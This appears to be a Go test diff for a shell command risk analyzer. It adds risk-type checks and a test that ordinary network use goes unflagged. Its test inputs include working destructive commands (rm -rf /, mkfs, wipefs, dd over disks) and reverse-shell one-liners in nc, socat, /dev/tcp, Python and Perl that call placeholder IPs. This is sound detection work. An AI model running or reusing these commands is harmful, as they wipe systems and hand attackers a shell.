@@ -187,7 +187,7 @@ func TestAnalyzeRecordsRiskWithoutStoppingSimulation(t *testing.T) {
 		t.Fatalf("detections = %#v, want one", response.Detections)
 	}
 	detection := response.Detections[0]
-	if detection.Command != "rm" || detection.NodeID == 0 || detection.PathID == 0 || detection.Sequence == 0 {
+	if detection.Command != "rm" || detection.Type != "destructive_operation" || detection.NodeID == 0 || detection.PathID == 0 || detection.Sequence == 0 {
 		t.Fatalf("detection = %#v, want located rm risk", detection)
 	}
 	if !strings.Contains(detection.Error, "command risk detected") {
@@ -223,22 +223,32 @@ func TestAnalyzeAppliesDetectionMiddlewareToBuiltinCommands(t *testing.T) {
 
 func TestAnalyzeRegistersCommonRiskCommands(t *testing.T) {
 	tests := []*struct {
-		name    string
-		source  string
-		command string
+		name     string
+		source   string
+		command  string
+		riskType commandanalysis.RiskType
 	}{
-		{name: "absolute rm", source: "/bin/rm -rf /", command: "/bin/rm"},
-		{name: "poweroff", source: "poweroff", command: "poweroff"},
-		{name: "reboot", source: "reboot", command: "reboot"},
-		{name: "halt", source: "halt", command: "halt"},
-		{name: "shutdown", source: "shutdown now", command: "shutdown"},
-		{name: "init", source: "init 0", command: "init"},
-		{name: "telinit", source: "telinit 6", command: "telinit"},
-		{name: "systemctl", source: "systemctl poweroff", command: "systemctl"},
-		{name: "nc", source: "nc -e /bin/sh 10.0.0.1 4444", command: "nc"},
-		{name: "ncat", source: "ncat --exec=/bin/sh 10.0.0.1 4444", command: "ncat"},
-		{name: "netcat", source: "netcat -c /bin/sh 10.0.0.1 4444", command: "netcat"},
-		{name: "socat", source: "socat TCP:10.0.0.1:4444 EXEC:/bin/sh", command: "socat"},
+		{name: "absolute rm", source: "/bin/rm -rf /", command: "/bin/rm", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "poweroff", source: "poweroff", command: "poweroff", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "reboot", source: "reboot", command: "reboot", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "halt", source: "halt", command: "halt", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "shutdown", source: "shutdown now", command: "shutdown", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "init", source: "init 0", command: "init", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "telinit", source: "telinit 6", command: "telinit", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "systemctl", source: "systemctl poweroff", command: "systemctl", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "nc", source: "nc -e /bin/sh 10.0.0.1 4444", command: "nc", riskType: commandanalysis.RiskTypeReverseShell},
+		{name: "ncat", source: "ncat --exec=/bin/sh 10.0.0.1 4444", command: "ncat", riskType: commandanalysis.RiskTypeReverseShell},
+		{name: "netcat", source: "netcat -c /bin/sh 10.0.0.1 4444", command: "netcat", riskType: commandanalysis.RiskTypeReverseShell},
+		{name: "socat", source: "socat TCP:10.0.0.1:4444 EXEC:/bin/sh", command: "socat", riskType: commandanalysis.RiskTypeReverseShell},
+		{name: "find delete", source: "find / -delete", command: "find", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "mkfs variant", source: "mkfs.ext4 /dev/sda1", command: "mkfs.ext4", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "wipefs", source: "wipefs --all /dev/nvme0n1", command: "wipefs", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "dd", source: "dd if=/dev/zero of=/dev/vda", command: "dd", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "shell network channel", source: "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1", command: "sh", riskType: commandanalysis.RiskTypeReverseShell},
+		{name: "versioned Python reverse shell", source: `python3.11 -c 'import os,socket,pty;s=socket.socket();s.connect(("198.51.100.42",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`, command: "python3.11", riskType: commandanalysis.RiskTypeReverseShell},
+		{name: "Perl reverse shell", source: `perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("198.51.100.42")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`, command: "perl", riskType: commandanalysis.RiskTypeReverseShell},
+		{name: "sudo wrapper", source: "sudo rm -rf /", command: "rm", riskType: commandanalysis.RiskTypeDestructiveOperation},
+		{name: "nested shell wrapper", source: "sudo sh -c 'setsid rm -rf /'", command: "rm", riskType: commandanalysis.RiskTypeDestructiveOperation},
 	}
 
 	for _, test := range tests {
@@ -250,7 +260,26 @@ func TestAnalyzeRegistersCommonRiskCommands(t *testing.T) {
 			if got := response.Detections[0].Command; got != test.command {
 				t.Fatalf("detected command = %q, want %q", got, test.command)
 			}
+			if got := response.Detections[0].Type; got != test.riskType {
+				t.Fatalf("detected type = %q, want %q", got, test.riskType)
+			}
 		})
+	}
+}
+
+func TestAnalyzeDoesNotClassifyOrdinaryNetworkActivity(t *testing.T) {
+	tests := []string{
+		`nc 10.0.0.1 4444`,
+		`nc >/dev/tcp/10.0.0.1/4444`,
+		`bash -i >/dev/tcp/10.0.0.1/4444`,
+		`producer | bash -i`,
+		`socat STDIO EXEC:/bin/sh`,
+	}
+	for _, source := range tests {
+		response := analyze(&playgroundRequest{Source: source}, maximumTraceEvents)
+		if response.Error != "" || len(response.Detections) != 0 {
+			t.Fatalf("source %q: response = %#v, want no risk", source, response)
+		}
 	}
 }
 
